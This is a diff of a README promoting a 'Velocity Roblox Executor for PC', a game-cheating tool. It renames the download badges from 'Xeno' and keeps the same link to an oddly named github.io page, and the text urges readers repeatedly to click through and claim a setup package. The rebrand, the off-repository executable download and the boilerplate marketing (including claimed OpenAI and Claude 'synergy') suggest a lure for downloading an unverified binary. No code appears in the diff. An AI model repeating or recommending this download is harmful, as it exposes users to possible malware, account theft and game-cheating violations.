@@ -1,8 +1,7 @@
 # 🚀 Velocity Roblox Executor for PC – Advanced Scripting Framework
 
-[![Download](https://img.shields.io/badge/Download-Xeno-Executor)](https://gfgtghh.github.io/velocity/)
+[![Download](https://img.shields.io/badge/Download-Velocity-Executor)](https://gfgtghh.github.io/velocity/)
 
-![xeno](https://github.com/user-attachments/assets/90c57674-ceaf-4699-aaff-8fcff42456f9)
   
 **Welcome to the official repository for Velocity Roblox Executor for PC – the all-in-one scripting experience, crafted for creators, experimenters, and explorers within the Roblox PC world.** Here, you’ll discover a suite designed to empower your Roblox journey with seamless execution, intelligent integrations, and user-focused features like 24/7 multilingual support.
 
@@ -59,7 +58,7 @@ Through OpenAI and Claude API synergy, you’ll gain unprecedented tools for cre
 ## 🔗 Download & Setup
 
 **Start your journey with Velocity now:**  
-[![Download](https://img.shields.io/badge/Download-Xeno-Executor)](https://gfgtghh.github.io/velocity/)
+[![Download](https://img.shields.io/badge/Download-Velocity-Executor)](https://gfgtghh.github.io/velocity/)
 
 **How-To:**
 1. Click the badge above to claim your Velocity Executor Setup package.
@@ -176,7 +175,7 @@ For details, see the [LICENSE](./LICENSE) file.
 ## 🚦 Download Again
 
 Ready to supercharge your Roblox experience?  
-[![Download](https://img.shields.io/badge/Download-Xeno-Executor)](https://gfgtghh.github.io/velocity/)
+[![Download](https://img.shields.io/badge/Download-Velocity-Executor)](https://gfgtghh.github.io/velocity/)
 
 ---
 
